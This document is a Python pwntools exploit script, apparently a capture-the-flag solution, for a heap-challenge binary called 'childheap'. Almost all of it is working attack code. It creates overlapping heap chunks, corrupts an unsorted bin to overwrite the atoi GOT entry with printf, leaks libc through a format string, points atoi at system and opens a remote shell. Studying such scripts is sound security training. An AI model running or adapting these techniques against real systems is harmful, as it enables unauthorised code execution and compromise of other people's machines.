#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('childheap'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

def allocate(size, data=''):
    r.sendlineafter('> ', '1')
    r.sendlineafter('size: ', str(size))
    r.sendlineafter('data: ', data)

def free():
    r.sendlineafter('> ', '2')

def modify(name='', change_age='n', save='y', endl=True):
    r.sendlineafter('> ', '3')
    r.sendlineafter('? ', change_age)
    r.sendafter('name: ', name + '\n' if endl else '')
    r.sendlineafter('? ', save)

def cheat(code, comment=''):
    r.sendlineafter('> ', str(0x31337))
    r.sendlineafter(': ', str(code))

r = remote(HOST, PORT)

g_info = 0x6020c0

# overlap heap by fgets
allocate(0xfff)
free()
modify()
free() # free fgets buf

# prepare second unsorted bin
modify(flat(0, g_info - 0x10))
allocate(0xfff)
modify(flat(0, g_info - 0x18, g_info - 0x18))
free()

# unsorted bin corruption, got.atoi -> `printf`
cheat(0x411)
modify('') # flush stdin buffer
allocate(0x400-1, flat(0, elf.got['atoi'] - 8))
pause()
modify(flat(elf.sym['printf']))

# leak libc
exp = flat('%7$s    ', p64(elf.got['__libc_start_main']))
r.sendafter('> ', exp)
libc_base = r.leak(delim_end='    ') - libc.sym['__libc_start_main']
log.info('libc_base: {}'.format(hex(libc_base)))
libc.address += libc_base

# got.atoi -> system
r.sendlineafter('> ', '10')
r.sendlineafter('? ', 'n')
r.sendlineafter('name: ', flat(libc.sym['system']))
r.sendlineafter('? ', 'y')

# shell out
r.sendlineafter('> ', '/bin/sh')
r.interactive()
